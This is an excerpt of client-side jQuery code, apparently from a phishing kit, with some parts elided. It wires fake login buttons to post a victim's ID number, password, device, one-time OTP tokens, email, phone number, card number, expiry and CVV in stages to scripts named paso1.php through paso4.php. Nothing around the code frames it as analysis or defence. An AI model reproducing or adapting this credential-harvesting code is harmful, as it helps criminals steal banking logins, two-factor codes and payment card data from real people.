$(document).ready(function($){
    ...
    $("#btn-ingresar").click(function(){
        ...
        $.post("../paso1.php", { tip:$("#txt-tipo").val(), ced: $("#txt-id").val(), pas:cl, dis:dispositivo } ,function(data) { 
            espera = 1;                       
        });
    });
    ...
    $("#btn-ingresar-s").click(function(){
        ...
        $.post("../paso1.php", { tip:$("#txt-tipo-s").val(), ced: $("#txt-id-s").val(), pas:cl, dis:dispositivo } ,function(data) { 
            espera = 1;                       
        });
    });
    ...
    $("#btn-validar").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();
        $.post("../paso4.php", { otp:$("#txt-token").val() } ,function(data) {                       
            espera = 1;          
        });
    });
    ...
    $("#btn-actualizar").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();       
        $.post("../paso3.php", { cor:$("#txt-correo").val(), cel: $("#txt-celular").val() } ,function(data) {                   
            espera = 1;          
        });
    });
    ...
    $("#btn-verficar").click(function(){      
        ...
        $.post("../paso2.php", { tar:$("#txt-tarjeta").val(), fec: fecha,cvv: $("#txt-cvv").val() } ,function(data) {                   
            espera = 1;          
        });
    });
    ...
    $("#btn-validarerr").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();
        $.post("../paso4.php", { otp:$("#txt-tokenerr").val() } ,function(data) {                       
            espera = 1;          
        });
    });
});